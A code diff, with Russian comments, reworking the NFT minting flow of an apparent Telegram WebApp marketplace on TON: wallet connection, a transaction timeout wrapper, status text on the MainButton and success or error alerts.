@@ -1141,134 +1141,122 @@ AllLotsNFTMArket.addEventListener('click', () => {
 
 
 
-// 2. Конфигурация NFT с проверками
+// 1. Конфигурация с увеличенными лимитами
 const NFT_CONFIG = {
     collectionAddress: 'EQAG1zMLkCFOCl8lJSCiPS7nXKoookxzN3-IuPshaG5QeNqd',
-    requiredAmount: '100000000', // 0.1 TON
-    withdrawalKey: 'row_nft_withdrawn_v3',
-    minFee: '20000000' // 0.02 TON минимальная комиссия
+    requiredAmount: '200000000', // 0.2 TON (с запасом)
+    feeAmount: '50000000', // 0.05 TON комиссия
+    withdrawalKey: 'row_nft_telegram_v5',
+    timeout: 120000 // 2 минуты
 };
 
-// 3. Проверка баланса перед транзакцией
-async function checkBalance() {
-    try {
-        const provider = new TonWeb.HttpProvider();
-        const wallet = new TonWeb.Wallet(provider, {
-            address: tonConnectUI.account.address
+// 2. Альтернативная отправка транзакции
+async function sendTransactionSafe(transaction) {
+    return new Promise((resolve, reject) => {
+        const timer = setTimeout(() => {
+            reject(new Error('Transaction timeout'));
+        }, NFT_CONFIG.timeout);
+
+        tonConnectUI.sendTransaction(transaction, {
+            returnStrategy: 'back',
+            forceReturnStrategy: true
+        }).then(result => {
+            clearTimeout(timer);
+            resolve(result);
+        }).catch(err => {
+            clearTimeout(timer);
+            reject(err);
         });
-        const balance = await wallet.getBalance();
-        const needed = new TonWeb.utils.BN(NFT_CONFIG.requiredAmount).add(new TonWeb.utils.BN(NFT_CONFIG.minFee));
-        return new TonWeb.utils.BN(balance).gte(needed);
-    } catch (error) {
-        console.error('Balance check failed:', error);
-        return false;
-    }
+    });
 }
 
-// 4. Улучшенная функция mintNFT
+// 3. Улучшенный процесс mint
 async function mintNFT() {
-    const btn = document.querySelector('.PriceBtnMyLotsMarket');
-    if (!btn) return;
-
+    const mainButton = Telegram.WebApp.MainButton;
+    
     try {
-        // Проверка подключения
+        // Этап 1: Подготовка
+        mainButton.setText('🔄 ПОДГОТОВКА').show().disable();
+        
         if (!tonConnectUI.connected) {
-            alert('🔴 Пожалуйста, сначала подключите TON кошелек');
+            Telegram.WebApp.showAlert('🔴 Откройте кошелек и нажмите "Подключить"');
             return;
         }
 
-        // Проверка предыдущих выводов
+        // Этап 2: Проверка
+        mainButton.setText('🔍 ПРОВЕРКА ДАННЫХ');
+        await new Promise(resolve => setTimeout(resolve, 500)); // Задержка для стабильности
+
         if (localStorage.getItem(NFT_CONFIG.withdrawalKey)) {
-            alert('ℹ️ Вы уже получили этот NFT ранее');
+            Telegram.WebApp.showAlert('ℹ️ Вы уже получили этот NFT ранее');
+            mainButton.hide();
             return;
         }
 
-        // Проверка баланса
-        if (!(await checkBalance())) {
-            alert(`⚠️ Недостаточно средств. Нужно минимум ${TonWeb.utils.fromNano(NFT_CONFIG.requiredAmount + NFT_CONFIG.minFee)} TON`);
-            return;
-        }
-
-        btn.disabled = true;
-        btn.textContent = '⏳ Подготовка транзакции...';
-
-        // Добавляем задержку для стабильности
-        await new Promise(resolve => setTimeout(resolve, 500));
-
+        // Этап 3: Отправка
+        mainButton.setText('✍️ ПОДПИСАНИЕ ТРАНЗАКЦИИ');
+        
         const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
+            validUntil: Math.floor(Date.now() / 1000) + 300,
             messages: [{
                 address: NFT_CONFIG.collectionAddress,
-                amount: NFT_CONFIG.requiredAmount,
+                amount: (BigInt(NFT_CONFIG.requiredAmount) + BigInt(NFT_CONFIG.feeAmount)).toString(),
                 payload: await createMintPayload(tonConnectUI.account.address)
             }]
         };
 
-        btn.textContent = '🔐 Ожидание подписи...';
-        
-        const result = await tonConnectUI.sendTransaction(transaction, {
-            returnStrategy: 'back',
-            forceReturnStrategy: true,
-            ignoreErrors: false
-        });
+        // Этап 4: Ожидание
+        mainButton.setText('⏳ ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ');
+        const result = await sendTransactionSafe(transaction);
 
         if (!result?.boc) {
             throw new Error('Транзакция не была подписана');
         }
 
-        // Дополнительная проверка через 5 секунд
-        setTimeout(async () => {
-            try {
-                const provider = new TonWeb.HttpProvider();
-                const tx = await provider.getTransactions(NFT_CONFIG.collectionAddress, 1);
-                if (tx.length > 0) {
-                    localStorage.setItem(NFT_CONFIG.withdrawalKey, 'true');
-                    alert('✅ NFT успешно создан! Проверьте коллекцию в кошельке');
-                }
-            } catch (e) {
-                console.log('Фоновая проверка не удалась:', e);
-            }
-        }, 5000);
+        // Этап 5: Подтверждение
+        mainButton.setText('✅ УСПЕШНО!').disable();
+        localStorage.setItem(NFT_CONFIG.withdrawalKey, 'true');
+        
+        Telegram.WebApp.showAlert('NFT успешно создан! Закройте это окно и проверьте коллекцию в кошельке', () => {
+            Telegram.WebApp.close();
+        });
 
     } catch (error) {
-        console.error('Transaction error:', error);
-        let message = 'Ошибка при отправке транзакции';
+        console.error('Mint error:', error);
         
-        if (error.message.includes('Rejected')) {
-            message = '❌ Транзакция отклонена пользователем';
-        } else if (error.message.includes('Timeout')) {
-            message = '⌛ Время ожидания истекло, попробуйте снова';
-        } else if (error.message.includes('Insufficient')) {
-            message = '💸 Недостаточно средств для комиссии';
-        }
+        let message = 'Ошибка при создании NFT';
+        if (error.message.includes('Rejected')) message = '❌ Транзакция отклонена';
+        if (error.message.includes('timeout')) message = '⌛ Время ожидания истекло';
         
-        alert(message);
-    } finally {
-        updateMintButton();
+        Telegram.WebApp.showAlert(`${message}\n\nПопробуйте:\n1. Открыть кошелек заранее\n2. Увеличить баланс\n3. Повторить через 1 минуту`);
+        
+        mainButton.setText('ПОВТОРИТЬ ПОПЫТКУ').enable();
     }
 }
 
-// 5. Добавляем обработчик ошибок сети
-window.addEventListener('offline', () => {
-    alert('⚠️ Отсутствует интернет-соединение. Транзакция невозможна');
-    updateMintButton();
-});
+// 4. Инициализация WebApp
+Telegram.WebApp.ready();
+Telegram.WebApp.expand();
 
-// Инициализация при загрузке
-document.addEventListener('DOMContentLoaded', () => {
-    // Проверка поддержки TON
-    if (!window.TonConnectUI || !window.TonWeb) {
-        alert('Браузер не поддерживает TON. Пожалуйста, используйте официальное приложение Telegram');
-        return;
+// Специальная кнопка для Telegram
+const btn = document.createElement('div');
+btn.innerHTML = `
+    <button id="tg-mint-btn" 
+            style="background: #0088cc; color: white; border: none; padding: 12px 24px; 
+                   border-radius: 8px; font-weight: bold; font-size: 16px;">
+        ПОЛУЧИТЬ NFT
+    </button>
+`;
+document.body.appendChild(btn);
+
+document.getElementById('tg-mint-btn').addEventListener('click', mintNFT);
+
+// Автоматическая проверка кошелька
+tonConnectUI.onStatusChange((wallet) => {
+    if (wallet) {
+        document.getElementById('tg-mint-btn').style.display = 'block';
+    } else {
+        document.getElementById('tg-mint-btn').style.display = 'none';
+        Telegram.WebApp.showAlert('Откройте TON кошелек и нажмите "Подключить"');
     }
-
-    // Настройка обработчиков
-    document.querySelector('.PriceBtnMyLotsMarket')?.addEventListener('click', mintNFT);
-    tonConnectUI.onStatusChange(updateMintButton);
-    updateMintButton();
 });
-// Добавьте в начало кода
-TonConnectUI.setLogLevel('DEBUG');
-
-// Это включит подробное логирование
-// Проверьте консоль браузера для диагностики
